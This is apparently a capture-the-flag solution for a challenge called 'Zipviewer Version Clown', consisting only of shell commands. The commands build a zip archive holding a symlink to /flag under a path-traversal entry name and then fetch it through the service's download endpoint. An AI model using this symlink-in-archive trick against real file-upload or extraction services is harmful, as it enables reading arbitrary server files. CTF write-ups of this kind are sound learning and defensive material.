## Zipviewer Version Clown

Solution:

```
mkdir sol
cd sol
ln -s /flag f
mkdir a
cd ..
zip -y sol.zip sol/a/../f

GET /download/sol/f

``` 